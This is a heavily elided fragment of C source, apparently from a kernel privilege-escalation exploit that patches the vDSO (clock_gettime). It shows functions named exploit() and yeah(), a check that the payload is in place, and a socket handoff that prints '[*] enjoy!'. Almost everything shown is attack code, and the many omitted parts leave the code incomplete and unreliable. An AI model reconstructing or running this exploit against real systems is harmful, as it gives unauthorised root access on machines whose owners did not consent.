  ...
  fprintf(stderr, "clock_gettime_offset %p,  clock_gettime_addr %p\n", clock_gettime_offset, clock_gettime_addr);
	...
	for (i = 0; i < payload_len; i++) {
		if (p[i] != '\x00') {
			...
			fprintf(stderr, "looks like payload is placed\n");
			//return -1;
		}
	}
...
static int exploit(struct mem_arg *arg, bool do_patch)
{
  ...
  // part2, so start from i=1
	for (i = 1; i < ARRAY_SIZE(vdso_patch); i++) {
...
static int yeah(struct mem_arg *arg, int s)
{
  ...
  // i think this just means the remote cant accept further ones
	close(s);

	fprintf(stderr, "[*] enjoy!\n");

  // i think we lag due to this
	/*if (fork() == 0) {
